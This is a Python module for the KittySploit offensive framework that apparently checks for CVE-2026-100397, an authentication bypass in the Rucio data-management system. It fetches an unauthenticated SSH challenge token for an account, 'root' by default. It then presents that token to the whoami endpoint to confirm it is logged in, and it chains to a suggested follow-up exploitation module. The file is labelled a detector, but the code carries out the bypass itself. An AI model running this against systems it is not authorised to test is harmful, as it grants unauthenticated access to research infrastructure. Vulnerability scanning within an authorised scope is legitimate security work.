#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-100397 — Rucio SSH challenge token auth bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.rucio import Rucio


class Module(Scanner, Http_client, Rucio):
    __info__ = {
        "name": "Rucio CVE-2026-100397 auth bypass detect",
        "description": "Unauthenticated /auth/ssh_challenge_token accepted as X-Rucio-Auth-Token.",
        "author": ["LLCForge", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-100397"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-100397"],
        "tags": ["rucio", "auth-bypass", "cve-2026-100397"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/rucio_cve_2026_100397_auth_bypass",
                ],
            },
        },
    }

    rucio_account = OptString("root", "X-Rucio-Account for challenge token", required=False)

    def run(self):
        account = str(self.rucio_account or "root")
        token = self.rucio_ssh_challenge_token(account)
        if not token:
            return False
        code, body = self.rucio_whoami(token)
        if code != 200:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-100397",
            reason=f"whoami OK as {body.strip()[:80]}",
            account=account,
        )
        return True